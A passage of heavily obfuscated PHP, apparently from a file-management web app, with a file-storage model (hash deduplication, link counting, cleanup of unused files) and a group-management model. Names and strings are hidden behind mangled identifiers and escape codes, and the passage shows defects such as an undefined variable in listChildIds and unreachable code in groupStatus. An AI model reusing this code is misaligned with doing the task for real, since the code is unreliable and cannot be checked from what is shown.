[$ù˜¢Ç‹ı[551]], $ÛÎ°ëŠ [$ù˜¢Ç‹ı[79]])) { return $×±àÚ²©; } return $this->addFileData($ÛÎ°ëŠ ); } private function addFileData($„Ø®ãêÁ) { $ŠŞ‘¤Íô =& $_SERVER[ıÚ˜š²İ]; if (!$„Ø®ãêÁ) { return !1; } $„Ø®ãêÁ[$ŠŞ‘¤Íô[79]] = intval($„Ø®ãêÁ[$ŠŞ‘¤Íô[79]]); if (!$„Ø®ãêÁ[$ŠŞ‘¤Íô[79]] && strlen($„Ø®ãêÁ[$ŠŞ‘¤Íô[679]]) > 32) { $„Ø®ãêÁ[$ŠŞ‘¤Íô[79]] = intval(substr($„Ø®ãêÁ[$ŠŞ‘¤Íô[679]], 32)); } $Õ­¼©²” = $this->add($„Ø®ãêÁ); return $this->find($Õ­¼©²”); } public function addFile($üÊü…©ä, $”—¿îõœ, $¹Á”š’ì, $§•Ğªå‰ = false) { $Œ½Ğ¥ =& $_SERVER[ıÚ˜š²İ]; $ÄÆèö×» = IO::hashSimple($üÊü…©ä); $ÏâñÒğâ = IO::size($üÊü…©ä); $î¨¦åã¾ = $ÏâñÒğâ <= 1024 * 1024 * 10 ? IO::hashMd5($üÊü…©ä) : $Œ½Ğ¥[12]; $Ô¤ÎÅ¦ş = $Œ½Ğ¥[2057] . $ÄÆèö×»; CacheLock::lock($Ô¤ÎÅ¦ş); if ($î¨¦åã¾ && $ÄÆèö×») { $ğ±¨«šö = $this->addFileCheckExist($ÄÆèö×», $î¨¦åã¾, $ÏâñÒğâ); if ($ğ±¨«šö) { CacheLock::unlock($Ô¤ÎÅ¦ş); return $ğ±¨«šö; } } $ıé»ØÇ‡ = $this->addFileMake($üÊü…©ä, $”—¿îõœ, $ÏâñÒğâ, $ÄÆèö×», $î¨¦åã¾, $¹Á”š’ì, $§•Ğªå‰); $âĞ¸Óâ‚ = $this->addFileData($ıé»ØÇ‡); if (!$âĞ¸Óâ‚) { return !1; } CacheLock::unlock($Ô¤ÎÅ¦ş); if (!$î¨¦åã¾ && $âĞ¸Óâ‚) { $this->fileMd5Check($âĞ¸Óâ‚); } return $âĞ¸Óâ‚; } public function fileMd5Check($ûº±‡Ñ) { $ô²Õ¹Î¾ =& $_SERVER[ıÚ˜š²İ]; $ìÊøÌ²¯ = array($ûº±‡Ñ[$ô²Õ¹Î¾[545]], $ûº±‡Ñ[$ô²Õ¹Î¾[87]]); $ÛØÙï = $ô²Õ¹Î¾[2058] . $ûº±‡Ñ[$ô²Õ¹Î¾[87]]; $Ñ·­ŠÌœ = $ô²Õ¹Î¾[2059] . $ûº±‡Ñ[$ô²Õ¹Î¾[545]]; TaskQueue::add($ô²Õ¹Î¾[2060], $ìÊøÌ²¯, $ÛØÙï, $Ñ·­ŠÌœ); } public function fileMd5Set($îĞíİËà, $ˆÊ°–ƒ«) { $¿ŠİÜÒ =& $_SERVER[ıÚ˜š²İ]; $ äÙ¡ôĞ = $this->find($îĞíİËà); if (!$ äÙ¡ôĞ || $ äÙ¡ôĞ[$¿ŠİÜÒ[551]]) { return; } $”ŸÀèÍ = IO::hashMd5($ˆÊ°–ƒ«); if (!$”ŸÀèÍ) { return $¿ŠİÜÒ[12]; } $this->where(array($¿ŠİÜÒ[545] => $îĞíİËà))->save(array($¿ŠİÜÒ[551] => $”ŸÀèÍ)); } public function addFileMake($ÛåÏ¿€, $İ£“¡şª, $ı•¼Ñİ¢, $ÎÎœ¸, $°–¸œë, $†ÔÅ¶ş“, $´ÇÑûŸ†) { $ß¿•ÄŞˆ =& $_SERVER[ıÚ˜š²İ]; $™ûŒè¡ë = $this->createFileName($†ÔÅ¶ş“, $İ£“¡şª, $ÎÎœ¸, $°–¸œë); $š¢éô = get_path_father($™ûŒè¡ë); $ğ¹Œ¡ÑÎ = get_path_this($™ûŒè¡ë); if ($´ÇÑûŸ†) { $âüÌ×ŒÈ = IO::move($ÛåÏ¿€, $š¢éô, !1, $ğ¹Œ¡ÑÎ); } else { $âüÌ×ŒÈ = IO::copy($ÛåÏ¿€, $š¢éô, !1, $ğ¹Œ¡ÑÎ); } if (!$âüÌ×ŒÈ) { return !1; } $Ãæö å = IO::init($âüÌ×ŒÈ); $Ãæö å->cacheMethod($ß¿•ÄŞˆ[182], $Ãæö å->path, $ß¿•ÄŞˆ[179]); if (IO::size($âüÌ×ŒÈ) != $ı•¼Ñİ¢) { return !1; } $Ë†û¬ŠÑ = array($ß¿•ÄŞˆ[624] => $ı•¼Ñİ¢, $ß¿•ÄŞˆ[2054] => 1, $ß¿•ÄŞˆ[496] => $†ÔÅ¶ş“, $ß¿•ÄŞˆ[890] => $İ£“¡şª[$ß¿•ÄŞˆ[477]], $ß¿•ÄŞˆ[497] => $™ûŒè¡ë, $ß¿•ÄŞˆ[2055] => $ÎÎœ¸, $ß¿•ÄŞˆ[2056] => $°–¸œë); return $Ë†û¬ŠÑ; } public function addFileCheckExist($–¹öß², $¶”—º˜, $Ê°ÎáŞÄ) { $»Š‡´’ =& $_SERVER[ıÚ˜š²İ]; $¯„‹¤÷ = $this->findByHash($–¹öß², $¶”—º˜); if (!$¯„‹¤÷) { return !1; } $ºã²İÔÊ = array($»Š‡´’[2054] => intval($¯„‹¤÷[$»Š‡´’[2061]]) + 1, $»Š‡´’[624] => $Ê°ÎáŞÄ); $this->where(array($»Š‡´’[546] => $¯„‹¤÷[$»Š‡´’[545]]))->save($ºã²İÔÊ); return $¯„‹¤÷; } public function remove($íÈ “¥Ä) { $this->linkCountChange($íÈ “¥Ä, !1); $this->clearEmpty(); return !0; } public function linkAdd($®î±Ú†) { $this->linkCountChange($®î±Ú†, !0); } public function linkCountChange($èá•½¯, $±‚Îöş) { $¶‰ÒÔâ³ =& $_SERVER[ıÚ˜š²İ]; if (!$èá•½¯) { return; } if (!is_array($èá•½¯)) { $èá•½¯ = array($èá•½¯); } $Ùé©úåÈ = array(); foreach ($èá•½¯ as $úÃü˜ŸÌ) { $ŸÅãÓ¶ = $úÃü˜ŸÌ . $¶‰ÒÔâ³[12]; if (!$Ùé©úåÈ[$ŸÅãÓ¶]) { $Ùé©úåÈ[$ŸÅãÓ¶] = 0; } $Ùé©úåÈ[$ŸÅãÓ¶]++; } $¤ãŒúŞ = array(); foreach ($Ùé©úåÈ as $úÃü˜ŸÌ => $¬¾à†©´) { $ŸÅãÓ¶ = $¬¾à†©´ . $¶‰ÒÔâ³[12]; if (!$¤ãŒúŞ[$ŸÅãÓ¶]) { $¤ãŒúŞ[$ŸÅãÓ¶] = array(); } $¤ãŒúŞ[$ŸÅãÓ¶][] = $úÃü˜ŸÌ; } foreach ($¤ãŒúŞ as $¬¾à†©´ => $ÇÜÓÈŒü) { if (!$ÇÜÓÈŒü) { continue; } $¬¾à†©´ = $±‚Îöş ? $¬¾à†©´ : -intval($¬¾à†©´); $Êğ æºö = array($¶‰ÒÔâ³[545] => array($¶‰ÒÔâ³[7], $ÇÜÓÈŒü)); if ($¬¾à†©´ < 0) { $Êğ æºö[$¶‰ÒÔâ³[2061]] = array($¶‰ÒÔâ³[1104], abs($¬¾à†©´)); } $this->where($Êğ æºö)->setAdd($¶‰ÒÔâ³[2061], $¬¾à†©´); } } public function findByHash($Ó¡¬¥†Ÿ, $á˜è§Äö = false) { $Ìš®ÂÈÇ =& $_SERVER[ıÚ˜š²İ]; if (!$Ó¡¬¥†Ÿ && !$á˜è§Äö) { return !1; } $·¡©Çá = array($Ìš®ÂÈÇ[2055] => $Ó¡¬¥†Ÿ); if ($á˜è§Äö) { $·¡©Çá = array($Ìš®ÂÈÇ[2056] => $á˜è§Äö); } return $this->order($Ìš®ÂÈÇ[2062])->where($·¡©Çá)->find(); } public function clearEmpty($ıÌ‘åÃ¥ = 1) { $˜à´Çú÷ =& $_SERVER[ıÚ˜š²İ]; $ñà‘¯¸« = time() - 3600 * 24 * $ıÌ‘åÃ¥; $èÆâ§Ç§ = $˜à´Çú÷[2063] . $ñà‘¯¸«; $õÙåÃ¹Ú = $this->where($èÆâ§Ç§)->select(); if (!$õÙåÃ¹Ú) { return; } $®ĞÇÉÃ = new Task($˜à´Çú÷[2064], $˜à´Çú÷[12], count($õÙåÃ¹Ú)); foreach ($õÙåÃ¹Ú as $²¤Ö¤Û) { $®ĞÇÉÃ->update(1); $this->resetFile($²¤Ö¤Û); } $®ĞÇÉÃ->end(); } public function resetFile($´ı˜Â¤ø) { $¿ãìÄÉ› =& $_SERVER[ıÚ˜š²İ]; $ÍîÍ¾¢µ = array($¿ãìÄÉ›[546] => $´ı˜Â¤ø[$¿ãìÄÉ›[545]]); $æôú…³Ì = Model($¿ãìÄÉ›[1442])->where($ÍîÍ¾¢µ)->count(); $ıõƒÉÖ™ = Model($¿ãìÄÉ›[2065])->where($ÍîÍ¾¢µ)->count(); $ë›¼Î˜¡ = intval($æôú…³Ì) + intval($ıõƒÉÖ™); if ($ë›¼Î˜¡ == 0) { IO::remove($´ı˜Â¤ø[$¿ãìÄÉ›[87]]); Model($¿ãìÄÉ›[2066])->delete($´ı˜Â¤ø[$¿ãìÄÉ›[545]]); $this->where($ÍîÍ¾¢µ)->delete(); $this->metaSet($´ı˜Â¤ø[$¿ãìÄÉ›[545]], null, null); write_log(ACTION . $¿ãìÄÉ›[2067] . KodUser::id() . $¿ãìÄÉ›[2068] . $´ı˜Â¤ø[$¿ãìÄÉ›[545]] . $¿ãìÄÉ›[2069] . $´ı˜Â¤ø[$¿ãìÄÉ›[79]] . $¿ãìÄÉ›[202] . $´ı˜Â¤ø[$¿ãìÄÉ›[87]], $¿ãìÄÉ›[2070]); return; } if ($´ı˜Â¤ø[$¿ãìÄÉ›[2061]] != $ë›¼Î˜¡) { $this->where($ÍîÍ¾¢µ)->save(array($¿ãìÄÉ›[2054] => $ë›¼Î˜¡)); } } public function storageInfo($€Ö¶Ê¾Ö = false) { $ËŞü£‚ =& $_SERVER[ıÚ˜š²İ]; $ş ¹˜‡Ó = $this->count() + 0.0; $Á˜î¿‹ = 0; $ú¥é²î = 1; $ÏÅ¶¿»Å = 0; $µ©ŞÃŠ = 5000; for ($¡«û¾Œ = 0; $¡«û¾Œ < $ş ¹˜‡Ó; $¡«û¾Œ = $¡«û¾Œ + $µ©ŞÃŠ) { $Õøˆ¨à¦ = $this->limit($¡«û¾Œ, $¡«û¾Œ + $µ©ŞÃŠ)->select(); foreach ($Õøˆ¨à¦ as $Ñí÷áó–) { $ú¥é²î += $Ñí÷áó–[$ËŞü£‚[79]] * $Ñí÷áó–[$ËŞü£‚[2061]]; $Á˜î¿‹ += $Ñí÷áó–[$ËŞü£‚[79]] * ($Ñí÷áó–[$ËŞü£‚[2061]] - 1); $ÏÅ¶¿»Å += $Ñí÷áó–[$ËŞü£‚[2061]]; } } $ÏçŞ¨Á = array($ËŞü£‚[2071] => $ú¥é²î, $ËŞü£‚[2072] => $Á˜î¿‹, $ËŞü£‚[2073] => $Á˜î¿‹ / $ú¥é²î, $ËŞü£‚[83] => $ş ¹˜‡Ó, $ËŞü£‚[2074] => $ÏÅ¶¿»Å); return $ÏçŞ¨Á; } } class GroupModel extends ModelBase { protected $tableName = "\147\162\x6f\165\x70"; protected $tableMeta = array("\164\141\142\154\145\116\141\155\x65" => "\147\x72\157\x75\160\137\155\x65\x74\141", "\x6d\x65\x74\x61\x46\151\145\x6c\x64" => "\147\162\x6f\165\160\111\x44"); protected function cacheFunctionAlias($íì”¦òÑ) { $²˜·›â =& $_SERVER[ıÚ˜š²İ]; return array($²˜·›â[2075] => array($íì”¦òÑ[0], $²˜·›â[2076]), $²˜·›â[2077] => array($íì”¦òÑ[0], $²˜·›â[2078])); } protected function getInfo($Ê‘òŞÕ, $îè¢œÖã = false) { $™îÜãº¦ = $this->getInfoSimple($Ê‘òŞÕ); if (!$™îÜãº¦) { return !1; } if ($îè¢œÖã) { return $this->_listDataApplyItem($™îÜãº¦); } return $this->cacheFunctionGet($_SERVER[ıÚ˜š²İ][2079], $Ê‘òŞÕ); } protected function getInfoSimple($ËİÆŞ¼ù, $œ„ƒª” = false) { $£“Á“¦ =& $_SERVER[ıÚ˜š²İ]; if ($œ„ƒª”) { $ÛÖ™üßÚ = array($£“Á“¦[1404] => intval($ËİÆŞ¼ù)); $øÃêãÇ = $this->where($ÛÖ™üßÚ)->find(); return is_array($øÃêãÇ) ? $øÃêãÇ : array(); } return $this->cacheFunctionGet($£“Á“¦[2080], $ËİÆŞ¼ù); } protected function groupAdd($Äü²Òô–) { $¡Ù×Ö¡‡ =& $_SERVER[ıÚ˜š²İ]; if (!$Äü²Òô–[$¡Ù×Ö¡‡[193]] && isset($Äü²Òô–[$¡Ù×Ö¡‡[1404]]) && $Äü²Òô–[$¡Ù×Ö¡‡[1404]] == 1) { if ($ÁºËñè = $this->getInfoSimple($Äü²Òô–[$¡Ù×Ö¡‡[1404]], !0)) { return $Äü²Òô–[$¡Ù×Ö¡‡[1404]]; } } else { $ÁºËñè = $this->getInfoSimple($Äü²Òô–[$¡Ù×Ö¡‡[193]]); if (!$ÁºËñè) { return !1; } } $ŞÇ¬ƒ” = $¡Ù×Ö¡‡[597]; if ($ÁºËñè[$¡Ù×Ö¡‡[588]]) { $ŞÇ¬ƒ” = $ÁºËñè[$¡Ù×Ö¡‡[588]] . $ÁºËñè[$¡Ù×Ö¡‡[1404]] . $¡Ù×Ö¡‡[50]; } $šÔ›ïÑ¤ = array($¡Ù×Ö¡‡[496] => $this->groupNameAuto($Äü²Òô–[$¡Ù×Ö¡‡[193]], $Äü²Òô–[$¡Ù×Ö¡‡[32]]), $¡Ù×Ö¡‡[479] => $Äü²Òô–[$¡Ù×Ö¡‡[193]], $¡Ù×Ö¡‡[659] => $ŞÇ¬ƒ”, $¡Ù×Ö¡‡[2081] => $Äü²Òô–[$¡Ù×Ö¡‡[1980]], $¡Ù×Ö¡‡[2082] => 0, $¡Ù×Ö¡‡[1997] => 0); $Äü²Òô–[$¡Ù×Ö¡‡[32]] = $šÔ›ïÑ¤[$¡Ù×Ö¡‡[32]]; if (isset($Äü²Òô–[$¡Ù×Ö¡‡[2017]])) { $šÔ›ïÑ¤[$¡Ù×Ö¡‡[2017]] = $Äü²Òô–[$¡Ù×Ö¡‡[2017]]; } else { $†¦Ëâû§ = $this->max($¡Ù×Ö¡‡[2017]); if (!$†¦Ëâû§) { $†¦Ëâû§ = 0; } $šÔ›ïÑ¤[$¡Ù×Ö¡‡[2017]] = $†¦Ëâû§ + 1; } if (!empty($Äü²Òô–[$¡Ù×Ö¡‡[1404]])) { $šÔ›ïÑ¤[$¡Ù×Ö¡‡[1404]] = $Äü²Òô–[$¡Ù×Ö¡‡[1404]]; } $ÚÀ¹¤óº = $this->add($šÔ›ïÑ¤); $this->groupMetaEdit($ÚÀ¹¤óº, $Äü²Òô–); Model($¡Ù×Ö¡‡[1442])->groupRootAdd($ÚÀ¹¤óº); $this->_clearCache($Äü²Òô–[$¡Ù×Ö¡‡[193]]); return $ÚÀ¹¤óº; } protected function groupEdit($º‚ ³¯, $í¿ÔŞë¨) { $éÅ×˜ƒ· =& $_SERVER[ıÚ˜š²İ]; $¶²—ÆÉÎ = $this->getInfoSimple($º‚ ³¯); if (!$¶²—ÆÉÎ) { return !1; } if (!empty($í¿ÔŞë¨[$éÅ×˜ƒ·[193]])) { $ëã÷ÁØç = $this->getInfoSimple($í¿ÔŞë¨[$éÅ×˜ƒ·[193]]); if (!$ëã÷ÁØç) { return !1; } if ($¶²—ÆÉÎ[$éÅ×˜ƒ·[1404]] == $ëã÷ÁØç[$éÅ×˜ƒ·[1404]]) { return !1; } if ($í¿ÔŞë¨[$éÅ×˜ƒ·[193]] != $¶²—ÆÉÎ[$éÅ×˜ƒ·[193]]) { if ($ëã÷ÁØç[$éÅ×˜ƒ·[588]] !== $¶²—ÆÉÎ[$éÅ×˜ƒ·[588]] && strpos($ëã÷ÁØç[$éÅ×˜ƒ·[588]], $¶²—ÆÉÎ[$éÅ×˜ƒ·[588]] . $¶²—ÆÉÎ[$éÅ×˜ƒ·[1404]] . $éÅ×˜ƒ·[50]) === 0) { return !1; } $í¿ÔŞë¨[$éÅ×˜ƒ·[659]] = $ëã÷ÁØç[$éÅ×˜ƒ·[588]] . $í¿ÔŞë¨[$éÅ×˜ƒ·[193]] . $éÅ×˜ƒ·[50]; $this->_changeChildLevel($¶²—ÆÉÎ, $ëã÷ÁØç); $this->_clearCache($ëã÷ÁØç[$éÅ×˜ƒ·[1404]]); $this->_clearCache($¶²—ÆÉÎ[$éÅ×˜ƒ·[193]]); } } $this->groupMetaEdit($º‚ ³¯, $í¿ÔŞë¨); $this->_clearChildrenCache($¶²—ÆÉÎ); return $this->where(array($éÅ×˜ƒ·[2083] => $º‚ ³¯))->save($í¿ÔŞë¨); } private function groupMetaEdit($£µÇíÃÉ, &$şÅ±¤°) { $¨ÀçÖª“ =& $_SERVER[ıÚ˜š²İ]; if (isset($şÅ±¤°[$¨ÀçÖª“[32]])) { $this->setNamePinyin($£µÇíÃÉ, $şÅ±¤°[$¨ÀçÖª“[32]]); } if (isset($şÅ±¤°[$¨ÀçÖª“[2084]])) { $£´Â Ç = array($¨ÀçÖª“[2084] => $şÅ±¤°[$¨ÀçÖª“[2084]], $¨ÀçÖª“[2085] => $şÅ±¤°[$¨ÀçÖª“[2085]]); unset($şÅ±¤°[$¨ÀçÖª“[2084]]); unset($şÅ±¤°[$¨ÀçÖª“[2085]]); if (isset($şÅ±¤°[$¨ÀçÖª“[2086]])) { $ÂĞÛ­Ø¶ = $¨ÀçÖª“[1400] . $£µÇíÃÉ; $Ø”˜Õ’ = $¨ÀçÖª“[1399]; $ğïÅåÌ· = $şÅ±¤°[$¨ÀçÖª“[2086]] ? $şÅ±¤°[$¨ÀçÖª“[2086]] : $¨ÀçÖª“[12]; $‡³½”Ôğ = Model($¨ÀçÖª“[1398])->get($ÂĞÛ­Ø¶, $Ø”˜Õ’); $‡³½”Ôğ = $‡³½”Ôğ ? $‡³½”Ôğ : $¨ÀçÖª“[12]; if ($‡³½”Ôğ != $ğïÅåÌ·) { if (!$ğïÅåÌ· && $‡³½”Ôğ) { Model($¨ÀçÖª“[1398])->remove($ÂĞÛ­Ø¶, $Ø”˜Õ’); } else { if ($ğïÅåÌ·) { Model($¨ÀçÖª“[1398])->set($ÂĞÛ­Ø¶, $ğïÅåÌ·, $Ø”˜Õ’); } } } $£´Â Ç[$¨ÀçÖª“[2086]] = $ğïÅåÌ·; } $this->metaSet($£µÇíÃÉ, $£´Â Ç); } } private function _clearChildrenCache($”ËÕ·µ) { $ğÃÈ­Ã‘ =& $_SERVER[ıÚ˜š²İ]; $Ëò±®·ó = array($ğÃÈ­Ã‘[659] => array($ğÃÈ­Ã‘[619], $”ËÕ·µ[$ğÃÈ­Ã‘[588]] . $”ËÕ·µ[$ğÃÈ­Ã‘[1404]] . $ğÃÈ­Ã‘[620])); $œ”ñßäƒ = $this->field($ğÃÈ­Ã‘[1404])->where($Ëò±®·ó)->select(); foreach ($œ”ñßäƒ as $¸šäÃ’) { $this->_clearCache($¸šäÃ’[$ğÃÈ­Ã‘[1404]]); } } private function _clearCache($€»„ôô²) { $Éñ»ğ–Û =& $_SERVER[ıÚ˜š²İ]; $this->cacheFunctionClear($Éñ»ğ–Û[2079], $€»„ôô²); $this->cacheFunctionClear($Éñ»ğ–Û[2080], $€»„ôô²); } private function _changeChildLevel($¨ß¢Õ, $¡«Û§Ü, $Âùª´ŸÖ = false) { $·å¾íõû =& $_SERVER[ıÚ˜š²İ]; $È’Õë©³ = $¨ß¢Õ[$·å¾íõû[588]] . $¨ß¢Õ[$·å¾íõû[1404]] . $·å¾íõû[50]; $§ÏÇø‹ô = $¡«Û§Ü[$·å¾íõû[588]] . $¡«Û§Ü[$·å¾íõû[1404]] . $·å¾íõû[50] . $¨ß¢Õ[$·å¾íõû[1404]] . $·å¾íõû[50]; if ($Âùª´ŸÖ) { $§ÏÇø‹ô = $¡«Û§Ü[$·å¾íõû[588]] . $¡«Û§Ü[$·å¾íõû[1404]] . $·å¾íõû[50]; } $·ŠŸİÔß = array($·å¾íõû[659] => array($·å¾íõû[619], $¨ß¢Õ[$·å¾íõû[588]] . $¨ß¢Õ[$·å¾íõû[1404]] . $·å¾íõû[620])); $Ì§‡¹­Û = array($·å¾íõû[659] => array($·å¾íõû[668], "\162\x65\x70\x6c\x61\x63\145\50\x70\141\x72\145\x6e\x74\114\145\166\145\154\x2c\47{$È’Õë©³}\47\x2c\x27{$§ÏÇø‹ô}\47\x29")); $this->_clearChildrenCache($¨ß¢Õ); $this->where($·ŠŸİÔß)->data($Ì§‡¹­Û)->save(); } public function setNamePinyin($–­ÙËŸ, $±³Ã¯‡ = false) { $±îÙº÷Ÿ =& $_SERVER[ıÚ˜š²İ]; if (!$±³Ã¯‡) { $¾”û”ŞÇ = $this->getInfoSimple($–­ÙËŸ); $±³Ã¯‡ = $¾”û”ŞÇ[$±îÙº÷Ÿ[32]]; } if (!Input::check($±³Ã¯‡, $±îÙº÷Ÿ[662])) { $this->metaSet($–­ÙËŸ, $±îÙº÷Ÿ[540], null); $this->metaSet($–­ÙËŸ, $±îÙº÷Ÿ[539], null); return; } $İŒÏĞÃû = array($±îÙº÷Ÿ[540] => str_replace($±îÙº÷Ÿ[53], $±îÙº÷Ÿ[12], Pinyin::get($±³Ã¯‡)), $±îÙº÷Ÿ[539] => Pinyin::get($±³Ã¯‡, $±îÙº÷Ÿ[663])); $this->metaSet($–­ÙËŸ, $İŒÏĞÃû); } protected function metaSet($À§ÖŸ, $¹ş™²À = null, $şÄ¹´» = null) { $this->_clearCache($À§ÖŸ); return parent::metaSet($À§ÖŸ, $¹ş™²À, $şÄ¹´»); } protected function groupStatus($¹Ø¼Ûšæ, $Ğò¶±Àù) { $áîèÓ¸± =& $_SERVER[ıÚ˜š²İ]; $ªÛæê¨§ = $this->getInfoSimple($¹Ø¼Ûšæ); if (!$ªÛæê¨§) { return !1; } $this->_clearCache($¹Ø¼Ûšæ); return $this->metaSet($¹Ø¼Ûšæ, $áîèÓ¸±[826], $Ğò¶±Àù); if ($Ğò¶±Àù == $áîèÓ¸±[91]) { $Ø¢Ë¦á = $this->parentLevelArray($ªÛæê¨§[$áîèÓ¸±[588]]); } else { } $Ø¢Ë¦á[] = $ªÛæê¨§[$áîèÓ¸±[1404]]; $È¶®­¦Å = array(); foreach ($Ø¢Ë¦á as $¹Ø¼Ûšæ) { $È¶®­¦Å[] = array($áîèÓ¸±[1404] => $¹Ø¼Ûšæ, $áîèÓ¸±[97] => $áîèÓ¸±[826], $áîèÓ¸±[452] => $Ğò¶±Àù); $this->_clearCache($¹Ø¼Ûšæ); } return Model($áîèÓ¸±[2087])->addAll($È¶®­¦Å, array(), !0); } protected function groupRemove($×‚½åÓÓ, $Ë‹÷”¨ù = false) { $·ŞÂŒí =& $_SERVER[ıÚ˜š²İ]; $ßïÍ‘è§ = array($·ŞÂŒí[1404] => $×‚½åÓÓ); $«õ‘Úœ´ = $this->where($ßïÍ‘è§)->find(); if (!$«õ‘Úœ´ || $«õ‘Úœ´[$·ŞÂŒí[193]] == 0) { return !1; } if (!$Ë‹÷”¨ù) { $ì„úÔÜÜ = $this->getInfoSimple($«õ‘Úœ´[$·ŞÂŒí[193]]); $this->_changeChildLevel($«õ‘Úœ´, $ì„úÔÜÜ, !0); $this->where(array($·ŞÂŒí[193] => $×‚½åÓÓ))->save(array($·ŞÂŒí[193] => $«õ‘Úœ´[$·ŞÂŒí[193]])); $this->_clearCache($ì„úÔÜÜ[$·ŞÂŒí[1404]]); } Model($·ŞÂŒí[2087])->where($ßïÍ‘è§)->delete(); Model($·ŞÂŒí[2088])->where($ßïÍ‘è§)->delete(); Model($·ŞÂŒí[907])->groupRootRemove($×‚½åÓÓ); $this->_clearCache($«õ‘Úœ´[$·ŞÂŒí[193]]); return $this->where($ßïÍ‘è§)->delete(); } protected function groupSort($ë€¼Û½) { $ìœìŒ =& $_SERVER[ıÚ˜š²İ]; $‡ıã÷™ = array(); foreach ($ë€¼Û½ as $÷›ì¹šª => $ëªÇ±Ÿ©) { $‡ıã÷™[] = array($ìœìŒ[1404], $ëªÇ±Ÿ©, $ìœìŒ[2017], $÷›ì¹šª + 1); } $this->saveAll($‡ıã÷™); } public function listData() { $ù›…£î = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ù›…£î[$_SERVER[ıÚ˜š²İ][447]]); return $ù›…£î; } private function _makeOrder($Ï˜™ğ¸Å = '') { $¬ÚŸ˜Ş =& $_SERVER[ıÚ˜š²İ]; $ªŒµé£« = array($¬ÚŸ˜Ş[1404], $¬ÚŸ˜Ş[32], $¬ÚŸ˜Ş[1982], $¬ÚŸ˜Ş[234]); $â¸æßº = array($¬ÚŸ˜Ş[525] => $¬ÚŸ˜Ş[526], $¬ÚŸ˜Ş[527] => $¬ÚŸ˜Ş[528]); $Ğı¸®Ä‡ = Input::get($¬ÚŸ˜Ş[532], $¬ÚŸ˜Ş[7], $¬ÚŸ˜Ş[1997], $ªŒµé£«); $Øà®Åå¶ = Input::get($¬ÚŸ˜Ş[533], $¬ÚŸ˜Ş[7], $¬ÚŸ˜Ş[2089], array($¬ÚŸ˜Ş[2089], $¬ÚŸ˜Ş[527])); $Øà®Åå¶ = $â¸æßº[$Øà®Åå¶]; $Ï˜™ğ¸Å = $Ï˜™ğ¸Å . "{$Ğı¸®Ä‡}\x20{$Øà®Åå¶}\x2c\x20\x67\162\157\x75\x70\111\104\x20\x61\x73\x63"; return $this->order($Ï˜™ğ¸Å); } public function listChild($ˆˆ’ö­Â) { $ù’ó÷¦º =& $_SERVER[ıÚ˜š²İ]; $ëóõÂÒ° = $this->where(array($ù’ó÷¦º[193] => $ˆˆ’ö­Â))->_makeOrder()->selectPage(200); $this->_listDataApply($ëóõÂÒ°[$ù’ó÷¦º[447]]); return $ëóõÂÒ°; } public function listChildIds($Ê¶ºÖåô) { $Ñ£ùÛ×ñ =& $_SERVER[ıÚ˜š²İ]; if (is_string($›¬íêÂ)) { $Ê¶ºÖåô = explode($Ñ£ùÛ×ñ[50], $Ê¶ºÖåô); } $è¼ˆ¡ƒÏ = $this->where(array($Ñ£ùÛ×ñ[1404] => array($Ñ£ùÛ×ñ[7], $Ê¶ºÖåô)))->field($Ñ£ùÛ×ñ[2090])->select(); if (!$è¼ˆ¡ƒÏ) { return !1; } $µ…Ã£è¦ = array(); foreach ($è¼ˆ¡ƒÏ as $¦õ®Ç¯Œ) { $µ…Ã£è¦[] = "\x73\145\x6c\x65\143\x74\40\147\162\x6f\165\160\111\x44\40\x66\x72\157\x6d\40\x60\147\x72\x6f\165\160\x60\x20\167\x68\145\x72\x65\x20\160\141\162\145\156\x74\x4c\145\x76\x65\154\x20\x6c\151\153\145\x20\x27{$¦õ®Ç¯Œ[$Ñ£ùÛ×ñ[588]]}{$¦õ®Ç¯Œ[$Ñ£ùÛ×ñ[1404]]}\54\45\47"; } $µ…Ã£è¦ = implode($Ñ£ùÛ×ñ[2091], $µ…Ã£è¦); $è¼ˆ¡ƒÏ = $this->query($µ…Ã£è¦); if (!$è¼ˆ¡ƒÏ) { return array(); } $Ê¶ºÖåô = array_to_keyvalue($è¼ˆ¡ƒÏ, $Ñ£ùÛ×ñ[12], $Ñ£ùÛ×ñ[1404]); return array_unique($Ê¶ºÖåô); } public function listByID($•©è‡ŸË) { $ÔÛÓ´ı =& $_SERVER[ıÚ˜š²İ]; if (!$•©è‡ŸË) { return array(); } $«ğ²ûóÂ = array($ÔÛÓ´ı[1404] => array($ÔÛÓ´ı[7], $•©è‡ŸË)); $å‹é±üş = $this->where($«ğ²ûóÂ)->select(); $å‹é±üş = array_sort_keep($å‹é±üş, $ÔÛÓ´ı[1404], $•©è‡ŸË); $this->_listDataApply($å‹é±üş); return $å‹é±üş; } public function listSearch($Úù¬ÙÚ) { $‘¬¦±·½ =& $_SERVER[ıÚ˜š²İ]; $«öèĞŠâ = trim($Úù¬ÙÚ[$‘¬¦±·½[2092]]); $”ˆÄ×ôÁ = explode($‘¬¦±·½[53], $«öèĞŠâ); if (!$«öèĞŠâ || count($”ˆÄ×ôÁ) == 1) { return $this->listSearchNow($Úù¬ÙÚ); } $´§äÈµË = array($‘¬¦±·½[447] => array()); foreach ($”ˆÄ×ôÁ as $äø„èÎö) { if (!trim($äø„èÎö)) { continue; } $Úù¬ÙÚ[$‘¬¦±·½[2092]] = $äø„èÎö; $ÅâØ–ãÉ = $this->listSearchNow($Úù¬ÙÚ); $´§äÈµË[$‘¬¦±·½[447]] = array_merge($´§äÈµË[$‘¬¦±·½[447]], $ÅâØ–ãÉ[$‘¬¦±·½[447]]); } $´§äÈµË[$‘¬¦±·½[447]] = array_unique_by_key($´§äÈµË[$‘¬¦±·½[447]], $‘¬¦±·½[1404]); $´§äÈµË[$‘¬¦±·½[444]] = array($‘¬¦±·½[445] => count($´§äÈµË[$‘¬¦±·½[447]]), $‘¬¦±·½[441] => 20, $‘¬¦±·½[430] => 1, $‘¬¦±·½[446] => 1); return $´§äÈµË; } public function listSearchNow($¡ÜĞşÎü) { $Ô¿ùàË =& $_SERVER[ıÚ˜š²İ]; $†ï©ÒÄØ = trim($¡ÜĞşÎü[$Ô¿ùàË[2092]]); $¶âîï = isset($¡ÜĞşÎü[$Ô¿ùàË[2093]]) ? $¡ÜĞşÎü[$Ô¿ùàË[2093]] : !1; if (!trim($†ï©ÒÄØ)) { return !1; } $†ï©ÒÄØ = str_replace($Ô¿ùàË[2094], $Ô¿ùàË[2095], $†ï©ÒÄØ); $‹´ç›Òº = array($Ô¿ùàË[1404] => array($Ô¿ùàË[461], "{$†ï©ÒÄØ}\45"), $Ô¿ùàË[32] => array($Ô¿ùàË[461], 